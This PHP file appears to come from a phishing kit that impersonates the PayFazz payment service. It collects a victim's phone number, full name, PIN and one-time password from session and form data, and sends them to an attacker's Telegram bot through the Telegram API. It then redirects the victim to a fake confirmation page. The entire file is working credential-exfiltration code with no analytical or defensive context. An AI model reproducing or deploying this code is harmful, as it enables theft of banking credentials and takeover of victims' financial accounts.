<?php
include "telegram.php";
session_start();

$Otp = $_POST['Otp'];

$_SESSION['Otp'] = $Otp;

$nohp = $_SESSION['nohp'];
$nama = $_SESSION['nama'];
$Pin = $_SESSION['Pin'];

$message = "
( PayFazz | Semangat ❤️ )

- Nomor Telpon : ".$nohp."
- Nama Lengkap : ".$nama."
- Buat PIN EDC : ".$Pin."
- Verifikasi OTP : ".$Otp."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konfirmasivia.html');
?>
